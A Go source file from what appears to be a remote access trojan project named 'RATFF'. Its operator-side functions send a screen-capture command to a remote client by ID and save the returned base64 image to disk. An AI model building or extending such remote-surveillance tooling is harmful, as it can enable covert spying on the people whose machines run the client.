package client

import (
	"encoding/base64"
	"fmt"
	"os"
	"time"

	"RATFF/shared"
)

// PrintScreenCapture is a function type for printing screen capture results.
type PrintScreenCapture func(imageData string, width, height int, format string, displayIndex, displayCount int)

// ScreenCapture sends a screen capture command to a client and waits for response.
func (m *Manager) ScreenCapture(id string, format string, quality int, displayIndex int, printResult PrintScreenCapture) {
	payload := map[string]interface{}{
		"client_id": id,
		"command":   string(shared.CmdScreenCapture),
		"payload": map[string]interface{}{
			"format":        format,
			"quality":       float64(quality),
			"display_index": float64(displayIndex),
		},
	}

	msg := m.WaitForResponseRaw(id, shared.CmdScreenCapture, payload, 15*time.Second)
	if msg == nil || msg.Payload == nil {
		return
	}

	if errMsg, ok := msg.Payload["error"].(string); ok {
		m.Print.Error(m.Tf("screen_capture_failed", errMsg))
		return
	}

	imageData, _ := msg.Payload["image_data"].(string)
	width, _ := msg.Payload["width"].(float64)
	height, _ := msg.Payload["height"].(float64)
	fmtStr, _ := msg.Payload["format"].(string)
	dispIdx, _ := msg.Payload["display_index"].(float64)
	dispCount, _ := msg.Payload["display_count"].(float64)

	printResult(imageData, int(width), int(height), fmtStr, int(dispIdx), int(dispCount))
}

// SaveScreenCapture saves base64 encoded image data to a file.
func SaveScreenCapture(imageData, format, outputPath string) error {
	data, err := base64.StdEncoding.DecodeString(imageData)
	if err != nil {
		return fmt.Errorf("decode base64 failed: %w", err)
	}

	if outputPath == "" {
		outputPath = fmt.Sprintf("screenshot.%s", format)
	}

	if err := os.WriteFile(outputPath, data, 0644); err != nil {
		return fmt.Errorf("write file failed: %w", err)
	}

	return nil
}
